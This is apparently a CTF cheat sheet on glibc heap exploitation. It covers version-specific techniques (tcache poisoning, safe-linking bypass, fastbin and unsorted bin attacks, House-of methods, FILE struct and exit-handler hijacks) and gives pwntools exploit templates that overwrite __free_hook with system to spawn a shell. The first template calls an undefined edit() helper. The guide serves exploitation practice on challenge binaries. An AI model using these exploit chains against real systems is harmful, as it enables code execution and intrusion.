# Heap Usage (Heap Pwn)

## glibc version differences (must read)

All heap exploitation techniques are strongly tied to the glibc version. First, confirm the version:

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# or strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc version | Key Changes | Impact |
|-----------|---------|------|
| 2.26 and earlier | No tcache | unsorted/fastbin is the main battlefield |
| 2.27 | **Introduction to tcache** | tcache poisoning is extremely simple |
| 2.29 | Unsorted bin unlink hardening (chunk size check) | Unsorted bin attack disabled |
| 2.31 | tcache double check (key field) | tcache poisoning is somewhat complex |
| 2.32 | **safe-linking** (fd pointer XOR PROTECT_PTR) | Need to leak heap base first |
| 2.34 | **Remove __free_hook / __malloc_hook** | Switch to FILE struct / exit handlers |
| 2.35+ | Further reinforcement | Same as 2.34, FILE path is still usable |

## tcache poisoning (2.27 - 2.31)

### Principle

tcache is a per-thread cache, with one linked list per size class, a singly linked list (only fd).
Before 2.29, double free checks only looked at whether the head of the linked list was itself, not the traversal.

### Using Templates (2.27 - 2.31)

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: leak libc base ===
# Apply for a chunk larger than the tcache range (>0x408), free it into the unsorted bin, leaving a main_arena pointer
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # 防止合并
for i in range(7):
    free(i)
free(7)       # 第 8 个进 unsorted bin，fd/bk 指向 main_arena+96
add(9, 0x80)  # 切回来一部分，保留 fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 偏移，glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: tcache poisoning → write __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# Use UAF to change chunk11's fd to point to __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # 取出 chunk11
add(13, 0x30, p64(libc.sym['system']))  # 取出来的就是 __free_hook 地址，写 system

# Trigger: free a chunk containing "/bin/sh\x00"
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

## safe-linking bypass (2.32+)

```text
Principle: When tcache/fastbin's fd is written, it is XORed by PROTECT_PTR:
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

Bypass:
1. You must first leak a heap address (heap base)
2. Calculate the obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target
3. Write it in
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# leak heap base (unsorted bin residue / tcache fd residue)
heap_base = leaked_heap & ~0xfff

# poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

## fastbin attack (traditional, mainly before 2.26)

```text
Key points:
1. fastbin singly linked list (only fd), no size check except chunk size must match
2. After 2.27, tcache is prioritized; fastbin is used only when tcache is full.
3. It is still necessary to forge a piece of memory that looks like a chunk (size field = real chunk size, ± some).
```

```python
# double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# Change fd to a fake chunk (requires that the size bytes at fake_addr + 8 match 0x70)
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # 取出 fake_addr 处的 chunk
```

## unsorted bin attack (only 2.28 and earlier)

```text
Principle: Write any address to main_arena+88
Starting from 2.29, a check for bck->fd == victim was added, which cannot be bypassed
Usage: Override global_max_fast so that small chunks also go to the fastbin → used together with fastbin attack
```

```python
# Apply for unsorted size chunk
add(0, 0x100)
add(1, 0x100)  # 防止 top consolidation
free(0)
# UAF change bk pointer to target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # 从 unsorted 取出 → unlink → main_arena+88 写到 target
```

## large bin attack

```text
Principle: a large bin has one more layer of fd_nextsize / bk_nextsize than unsorted
Since 2.32, chunk size checks have also been added, but it can still be used to modify global_max_fast, _IO_list_all, etc.
Advanced techniques, often used in combinations like House of Husk
```

## House of XXX Quick Reference

| Name | Applicable Version | Core Idea |
|------|---------|---------|
| House of Force | 2.28 and before | Change top chunk size to a huge value → malloc arbitrary address |
| House of Lore | All Versions | Forge small bin chain → Return arbitrary address |
| House of Orange | 2.23-2.30 | unsorted attack modifies _IO_list_all triggers _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit overflow + fastbin attack to __malloc_hook |
| House of Einherjar | All Versions | Forge prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | tcache + unsorted bin combination, bypass tcache double free check |
| House of Husk | 2.27+ | Modify the hook table of printf (__printf_function_table) |
| House of Cat | 2.34+ | _IO_wfile_seekoff vtable exploitation, for versions without hooks |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

## Real Usage Steps (General 4 Steps)

```text
Step 1: leak heap base
- Allocate chunk → free to tcache (2.32+ retains obfuscated fd) → show → reverse engineer heap
- Or: allocate a large chunk → free to unsorted → switch back → show fd

Step 2: leak libc base
- Large chunk freed to unsorted bin, fd/bk residue main_arena address
  - show → leak → libc.address = leak - main_arena_offset

Step 3: Control IP
- 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
- 2.34+: FILE struct attack (_IO_2_1_stdout_ / stderr), modify vtable → _IO_wfile_jumps
- Or: hijack exit handlers (__exit_funcs / tls_dtor_list)

Step 4: getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
```

## Alternative path after libc 2.34+ has no hook

### FILE struct attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)

```text
Goal: When the program calls puts/printf, it eventually goes to _IO_file_xsputn → _IO_OVERFLOW → calls vtable
Hijacking:
1. Overwrite the vtable pointer of _IO_2_1_stderr_ to point to a forged vtable
2. Forge the vtable, making the __overflow field point to system or setcontext
3. Make the first 8 bytes of fp (FILE*) itself be "/bin/sh\x00" (as rdi for system)
Trigger: Any puts/printf/abort/exit will flush stderr
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
Principle: __run_exit_handlers traverses the __exit_funcs linked list and calls each destructor
Hijack: change the linked list node's func pointer to point to system, arg points to "/bin/sh"
Note: 2.34+ added PTR_DEMANGLE, and you need to leak the fs:[0x30] guard value in tls to forge it
```

### tls_dtor_list (more modern)

```text
__call_tls_dtors iteration, structure is similar, also need to bypass PTR_DEMANGLE
Applicable: It will be triggered when the program exits, more general than a FILE attack
```

## pwndbg / GEF heap debugging commands

```text
# pwndbg
heap              # Display all chunks in the current arena
bins              # Display tcache / fastbin / unsorted / small / large bins
tcache            # Looking at tcache by itself
find_fake_fast <addr> <size>  # Find an fd write point that can be used as a fake chunk
vis_heap_chunks   # Visualize heap layout

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

## Typical pwntools Template (Heap Menu Challenge)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO Packaging
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === Choose the tech stack based on the type of vulnerability later ===
```

## Notes

- **The glibc version is the fundamental issue** — the same binary paired with libc 2.27 and libc 2.34 has completely different exploitation paths
- **tcache capacity = 7** (per size class) — It will only overflow to unsorted/fastbin after 7 allocations
- **chunk size = user request + 0x10 header, aligned to 0x10** (without counting the 0x10 header, the actual writable area can exceed 0x8 because the prev_size of the next chunk is reused)
- **Remote heap spraying is unstable** — The server forks the model, and each connection brk/mmap may be different, randomization testing is required.
- **Do not leave unsorted remnants in the attack chain** — the main_arena pointer appearing in unexpected chunks will cause subsequent show outputs to be chaotic
- **safe-linking error rate** — When calculating PROTECT_PTR, remember it is `pos >> 12`, and pos is the address to write to, not the address it should point to